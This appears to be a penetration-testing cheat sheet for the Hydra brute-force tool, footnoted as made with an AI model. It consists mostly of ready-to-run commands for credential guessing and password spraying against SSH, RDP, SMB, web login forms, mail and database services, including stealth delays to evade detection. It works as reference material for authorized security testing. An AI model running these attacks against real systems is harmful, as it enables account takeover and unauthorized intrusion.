# Hydra

**Tags:** `#hydra` `#bruteforce` `#passwordattack` `#auth` `#credentialstuffing` `#spray`

Fast, parallelized login brute-forcer supporting 50+ protocols. The standard tool for online credential attacks against network services — SSH, FTP, HTTP forms, SMB, RDP, databases, mail protocols, and more. Use for both targeted brute force and password spraying.

**Source:** https://github.com/vanhauser-thc/thc-hydra
**Install:** pre-installed on Kali (`hydra`)

> [!warning] **Account Lockout** — Always verify lockout policy before attacking. Password spraying (one password, many users) is far safer than per-account brute force on production systems. Use `-t 1` and add delays (`-W`) when stealth matters.

---

## Core Flags

| Flag | Description |
|---|---|
| `-l <user>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-C <file>` | Colon-separated `user:pass` combo file |
| `-s <port>` | Non-default port |
| `-t <n>` | Threads (default 16, lower for stealth) |
| `-f` | Stop after first valid credential found |
| `-F` | Stop after first valid per host |
| `-v` / `-V` | Verbose / very verbose (show each attempt) |
| `-d` | Debug |
| `-o <file>` | Save output to file |
| `-w <n>` | Wait time between attempts (seconds) |
| `-W <n>` | Wait time between connects (seconds) |
| `-x <min:max:charset>` | Password generation mode |
| `-e nsr` | Try empty pass (`n`), login as pass (`s`), reverse (`r`) |
| `-u` | Loop users before passwords (better for spraying) |

---

## Protocol Syntax

```bash
# Standard format
hydra [options] <target> <service>
hydra [options] <service>://<target>

# With URI
hydra [options] <service>://<target>/<path>
```

---

## Common Services

### SSH

```bash
# Single user, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# User list, password list
hydra -L users.txt -P passwords.txt ssh://10.10.10.10

# Password spray — one password across all users (-u loops users first)
hydra -L users.txt -p 'Password123!' -u -f ssh://10.10.10.10

# Non-default port
hydra -l admin -P passwords.txt -s 2222 ssh://10.10.10.10

# Combo file (user:pass)
hydra -C combos.txt ssh://10.10.10.10

# Try blank, login=pass, reverse as quick checks
hydra -l root -e nsr ssh://10.10.10.10
```

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
hydra -L users.txt -P passwords.txt -s 2121 ftp://10.10.10.10 -V
```

### RDP

```bash
hydra -L users.txt -p 'Password123' rdp://10.10.10.10
hydra -l administrator -P passwords.txt rdp://10.10.10.10 -t 4

# Brute force with generated passwords (6-8 chars alphanumeric)
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 rdp://10.10.10.10
```

> [!note] Hydra's RDP module struggles with NLA-enforced targets. Use **Crowbar** instead for reliable RDP brute force against modern Windows.

### SMB

```bash
hydra -l administrator -P passwords.txt smb://10.10.10.10
hydra -L users.txt -p 'Password123' smb://10.10.10.10 -m SMB2    # SMB2
hydra -L users.txt -p 'Password123' smb://10.10.10.10 -m SMB3    # SMB3
```

> [!note] For SMB spraying at scale across a subnet, **CrackMapExec / NetExec** is more reliable and gives richer output.

### HTTP — Web Login Forms

The most flexible and commonly used Hydra module. Requires identifying the form parameters and failure/success indicator.

```bash
# POST form — failure string
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# POST form — success string (use S= instead of F=)
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Dashboard"

# POST form with HTTPS
hydra -l admin -P passwords.txt -s 443 https://10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Incorrect"

# POST form with additional headers (e.g. CSRF token — must be static or pre-fetched)
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^&_token=abc123:F=Invalid"

# HTTP GET form
hydra -l admin -P passwords.txt 10.10.10.10 http-get-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://10.10.10.10/admin/

# HTTP Basic Auth — non-default port
hydra -l admin -P passwords.txt -s 8080 http-get://10.10.10.10/
```

> [!tip] **Finding form parameters** — Intercept the login request in Burp Suite to identify the exact parameter names, the endpoint path, and a reliable failure/success string. The failure string (`F=`) is usually more reliable than a success string.

### Mail Protocols

```bash
# SMTP
hydra -L users.txt -P passwords.txt smtp://mail.target.com
hydra -L users.txt -P passwords.txt -s 587 smtp://mail.target.com    # submission port

# POP3
hydra -L users.txt -P passwords.txt pop3://mail.target.com

# IMAP
hydra -L users.txt -P passwords.txt imap://mail.target.com
```

### Databases

```bash
# MySQL
hydra -l root -P passwords.txt mysql://10.10.10.10

# MSSQL
hydra -l sa -P passwords.txt mssql://10.10.10.10

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://10.10.10.10
```

### Other Protocols

```bash
# VNC (password only — no username)
hydra -P passwords.txt vnc://10.10.10.10

# Telnet
hydra -l admin -P passwords.txt telnet://10.10.10.10

# SNMP (community string brute force)
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://10.10.10.10

# LDAP
hydra -L users.txt -P passwords.txt ldap3://10.10.10.10

# WinRM
hydra -L users.txt -P passwords.txt http-get://10.10.10.10:5985/wsman
```

---

## Password Spraying

Spray a single password across many accounts — avoids lockout, discovers weak/default creds.

```bash
# SSH spray
hydra -L users.txt -p 'Password123!' -u -f -t 4 ssh://10.10.10.10

# RDP spray across a subnet
hydra -L users.txt -p 'Welcome1' -u rdp://10.10.10.0/24

# HTTP form spray
hydra -L users.txt -p 'Summer2024!' 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid" -u -f -t 4

# Add delay between attempts to avoid detection
hydra -L users.txt -p 'Password1' -t 1 -W 3 ssh://10.10.10.10
```

---

## Output and Results

```bash
# Save results to file
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -o results.txt

# Verbose — see every attempt
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -V

# Stop after first valid cred found
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -f

# Resume an interrupted attack
hydra -R
```

---

## Supported Services (Quick Reference)

| Service | Module |
|---|---|
| SSH | `ssh` |
| FTP | `ftp` |
| RDP | `rdp` |
| SMB | `smb` |
| HTTP Basic Auth | `http-get` |
| HTTP POST Form | `http-post-form` |
| HTTPS POST Form | `https-post-form` |
| SMTP | `smtp` |
| POP3 | `pop3` |
| IMAP | `imap` |
| MySQL | `mysql` |
| MSSQL | `mssql` |
| PostgreSQL | `postgres` |
| VNC | `vnc` |
| Telnet | `telnet` |
| SNMP | `snmp` |
| LDAP | `ldap3` |
| Cisco | `cisco` |
| Redis | `redis` |

```bash
# List all supported modules
hydra -U <module>     # show module-specific help
hydra --list-modules  # list all modules (newer versions)
```

---

## Recommended Workflow

```
1. Identify service and confirm it's reachable
2. Gather valid usernames first (enum4linux, SMTP VRFY, Kerbrute, etc.)
3. Try -e nsr first (blank, login=pass, reverse) — catches low-hanging fruit
4. Password spray with one likely password across all users (-u -f)
5. Escalate to wordlist if spray fails — start small (fasttrack.txt)
6. Use rockyou.txt as last resort — flag lockout risk first
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
